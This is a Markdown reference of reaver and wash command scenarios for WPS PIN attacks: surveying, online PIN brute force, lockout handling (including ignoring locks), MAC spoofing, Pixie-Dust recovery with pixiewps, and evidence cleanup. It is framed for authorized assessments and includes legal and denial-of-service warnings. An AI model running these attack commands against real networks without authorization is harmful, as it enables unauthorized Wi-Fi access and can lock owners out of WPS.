# reaver — command scenarios for deep research

Installed build: Reaver v1.6.6 (Debian package `reaver` `1.6.6-2+b1`). Every
option below appears in [`help.txt`](help.txt). `wash` ships in the same
package and is the correct first step: confirm WPS is enabled before running
an attack.

> **Scope:** WPS PIN attacks associate with the AP, try credentials, and can
> lock its WPS function. Run reaver only on networks you are authorized to
> test, prefer Pixie-Dust (`-K`) over online PIN brute force, and never use
> `-L` without explicit permission because it can deny WPS to the owner.

## How to invoke

```text
@deep-research For an authorized WPS assessment, compare reaver 1.6.6 with
bully and the wifite 2.7.0 WPS path. How do the tools differ in PIN
sequencing, lockout handling, Pixie-Dust integration, and evidence output?
Which AP chipsets are known to be Pixie-Dust vulnerable, and how does a
patched AP behave differently? Cite the reaver and pixiewps repositories, the
WPS specification, Dominique Bongard's Pixie-Dust research, and vendor
advisories; return a capability and vulnerability matrix with confidence
notes.
```

Create an evidence workspace and record the radio state:

```bash
mkdir -p ~/reaver-demo/evidence
date -u +'%Y-%m-%dT%H:%M:%SZ' > ~/reaver-demo/evidence/run-start.txt
iw dev > ~/reaver-demo/evidence/iw-dev-before.txt
iw list > ~/reaver-demo/evidence/iw-list.txt
```

## Scenario 1 — survey and target validation

`wash` is the discovery tool. Never start reaver against an AP you have not
confirmed is advertising WPS.

| # | Command | How to use |
|---|---------|------------|
| 1 | `reaver -h` | All reaver options |
| 2 | `wash -h` | All wash options |
| 3 | `dpkg-query -W -f='${Version}\n' reaver` | Package version (ships both binaries) |
| 4 | `sudo wash -i wlan0mon` | Survey mode (default) |
| 5 | `sudo wash -i wlan0mon -a` | Show APs without WPS too |
| 6 | `sudo wash -i wlan0mon -j` | Extended WPS info as JSON |
| 7 | `sudo wash -i wlan0mon -p` | Show crack progress |
| 8 | `sudo wash -i wlan0mon -s` | Active scan mode |
| 9 | `sudo wash -i wlan0mon -c 6` | One channel |
| 10 | `sudo wash -i wlan0mon -5` | 5 GHz channels |

**Research questions**
- Which APs advertise WPS, and which version and configuration?
- What does `-a` add that the default survey hides?
- What is the difference between survey and scan mode?
- Which fields in the JSON output are not in the table?
- Why does `wash` need monitor mode rather than a normal association?

**Sources:** `wash -h`; `reaver -h`; Wi-Fi Alliance WPS specification;
upstream wash documentation.
**Output:** a WPS-enabled target list with version and lock status.

## Scenario 2 — basic online PIN attack

The online attack is the slow path. Pin the channel, start verbose, and bound
the attempt count so a mistake cannot run for days.

| # | Command | How to use |
|---|---------|------------|
| 11 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv` | Default attack, verbose |
| 12 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -c 6 -vv` | Pin channel 6 |
| 13 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -e TargetSSID -vv` | Supply the ESSID |
| 14 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -m 02:00:00:00:00:01 -vv` | Spoof the host MAC |
| 15 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -g 50 -vv` | Stop after 50 attempts |
| 16 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -d 5 -vv` | 5-second delay |
| 17 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -t 20 -T 1.0 -vv` | Longer timeouts |
| 18 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -w -vv` | Windows 7 registrar mode |

**Research questions**
- How does reaver derive the first and second PIN halves?
- What does the AP's M5/M7 exchange contribute to the attempt?
- Why does the default delay exist, and what changes with `-d 0`?
- When is `-w` required, and what does it change in the messages?
- What does `-m` change about the association and the AP's logs?

**Sources:** `reaver -h`; WPS specification (M1–M8 exchange); upstream reaver
documentation.
**Output:** an attempt log with per-PIN timing and AP responses.

## Scenario 3 — lockout handling and session control

Lockouts are the defining constraint of online WPS attacks. The right answer
is usually to slow down, not to ignore them.

| # | Command | How to use |
|---|---------|------------|
| 19 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -l 300 -vv` | Wait 5 minutes after a lock |
| 20 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -r 10:60 -vv` | Sleep 60 s every 10 attempts |
| 21 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -x 30 -vv` | Wait after 10 unexpected failures |
| 22 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -L -vv` | Ignore reported locks (risky) |
| 23 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -s /tmp/target.session -vv` | Resume a session |
| 24 | `ls -l /tmp/target.session` | Confirm the session file exists |
| 25 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -E -vv` | Terminate each session with EAP FAIL |
| 26 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -N -vv` | Do not send NACKs |

**Research questions**
- What does an AP lockout look like in the reaver log?
- How long do common APs lock, and is it time-based or attempt-based?
- What is the difference between `-l`, `-r`, and `-x`?
- Why is `-L` a denial-of-service risk rather than a bypass?
- What does `-E` change for the next attempt?

**Sources:** `reaver -h`; vendor lockout documentation; upstream reaver wiki.
**Output:** a lockout timeline with the delay policy that avoided it.

## Scenario 4 — Pixie-Dust

Pixie-Dust is offline once the handshake is captured. It either works quickly
or fails quickly; there is no reason to run it for hours.

| # | Command | How to use |
|---|---------|------------|
| 27 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -K -vv` | Pixie-Dust attack |
| 28 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -Z -vv` | Alias for `-K` |
| 29 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -K -S -vv` | Small DH keys |
| 30 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -K -c 6 -vv` | Pin the channel |
| 31 | `pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce> -m <r-nonce> -b <e-bssid>` | Compute offline |
| 32 | `pixiewps -e <pke> -s <e-hash1> -z <e-hash2> -S -n <e-nonce> -m <r-nonce> -b <e-bssid>` | Short form with small DH |
| 33 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -K -O /tmp/pixie.pcap -vv` | Capture the handshake |

**Research questions**
- Which values in the M1/M2/M3 exchange does Pixie-Dust need?
- Why does `-S` have to match between reaver and pixiewps?
- Which chipsets are vulnerable, and what makes their nonces weak?
- What does a patched AP return that defeats the attack?
- Why is Pixie-Dust offline after capture, and what does that save?

**Sources:** `reaver -h`; `pixiewps -h`; the Pixie-Dust research by Dominique
Bongard; WPS specification; vendor advisories.
**Output:** a per-AP Pixie-Dust result with the vulnerable parameter.

## Scenario 5 — known PINs, output, and post-recovery actions

Sometimes the PIN is already known from another source. Reaver can use it, and
can run a command on success.

| # | Command | How to use |
|---|---------|------------|
| 34 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -p 12345670 -vv` | Try an 8-digit PIN |
| 35 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -p 1234 -vv` | Try a 4-digit half |
| 36 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -p 'arbitrary' -vv` | Arbitrary string |
| 37 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -C 'echo ok >> /tmp/wps.log' -vv` | Run a command on recovery |
| 38 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -O /tmp/wps.pcap -vv` | Save packets of interest |
| 39 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -A -vv` | No association |
| 40 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -J -vv` | DIR-300/320 NACK handling |
| 41 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -F -vv` | Ignore FCS errors |
| 42 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -q -vv` | Quiet plus verbose (compare) |

**Research questions**
- What does reaver do with a 4-digit `-p` value?
- Is `-p` a shortcut or a full attempt with the usual messages?
- What does `-C` receive in its environment, if anything?
- Why is `-A` rarely useful without an external supplicant?
- Which of `-J` and `-F` hides a real problem rather than fixing it?

**Sources:** `reaver -h`; upstream reaver README; WPS specification.
**Output:** a known-PIN run record and a post-recovery action log.

## Scenario 6 — evidence, verification, and cleanup

WPS attacks change the AP's state. Prove what you did and leave the radio
clean.

| # | Command | How to use |
|---|---------|------------|
| 43 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv 2>&1 \| tee ~/reaver-demo/evidence/run.log` | Full evidence log |
| 44 | `sudo wash -i wlan0mon` | Re-survey after the run |
| 45 | `iw dev` | Confirm interface state |
| 46 | `sudo airmon-ng stop wlan0mon` | Remove the monitor interface |
| 47 | `sudo systemctl restart NetworkManager` | Restore connectivity |
| 48 | `ls -l /tmp/wps.pcap ~/reaver-demo/evidence/` | Collect artifacts |
| 49 | `sha256sum /tmp/wps.pcap` | Hash the evidence |
| 50 | `rm -f /tmp/target.session` | Remove resumable state at close |

**Research questions**
- Which artifacts prove a PIN was recovered, and which only show attempts?
- What does a post-run `wash` tell you about the AP's lock state?
- Why hash a capture before storing it?
- What must be removed so a later run does not resume stale state?
- How do you verify the radio is back in managed mode?

**Sources:** `reaver -h`; `wash -h`; `iw dev`; `airmon-ng` usage; evidence
handling practice.
**Output:** a hashed evidence set and a signed-off cleanup checklist.

## Flag coverage checklist

| Help group / flag | Scenario |
|-------------------|----------|
| `-i`, `-b` | 2 |
| `-m`, `-e`, `-c`, `-s`, `-C` | 2, 3, 5 |
| `-f`, `-5`, `-v`, `-q`, `-h` | 2 |
| `-p` | 5 |
| `-d`, `-l`, `-g`, `-x`, `-r` | 2, 3 |
| `-t`, `-T` | 2 |
| `-A`, `-N`, `-S`, `-L`, `-E`, `-J`, `-F`, `-w` | 3, 4, 5 |
| `-K`, `-Z` | 4 |
| `-O` | 4, 5 |
| `wash -i`, `-f`, `-c`, `-n`, `-O`, `-F` | 1 |
| `wash -2`, `-5`, `-s`, `-u`, `-a`, `-j`, `-U`, `-p` | 1 |

Full text: [`help.txt`](help.txt); wash: [`../wash/help.txt`](../wash/help.txt).

## Scenario index

| Scenario | Task | Commands |
|----------|------|----------|
| 1 | Survey and target validation | 10 |
| 2 | Basic online PIN attack | 8 |
| 3 | Lockout handling and session control | 8 |
| 4 | Pixie-Dust | 7 |
| 5 | Known PINs, output, post-recovery | 9 |
| 6 | Evidence, verification, cleanup | 8 |
| **Total** | | **50** |

## Legal and safety

WPS attacks associate with the AP, submit credentials, and can lock WPS for
its owner. Use reaver only with written authorization and a named target.
Prefer Pixie-Dust (`-K`) because it is offline after capture; never use `-L`
without explicit permission. Before leaving, stop the run, re-survey to
record the AP's state, remove the monitor interface, restore
NetworkManager/wpa_supplicant, and delete session files. Captures and
recovered PINs are sensitive evidence: encrypt them, hash them, and keep only
what the report requires.
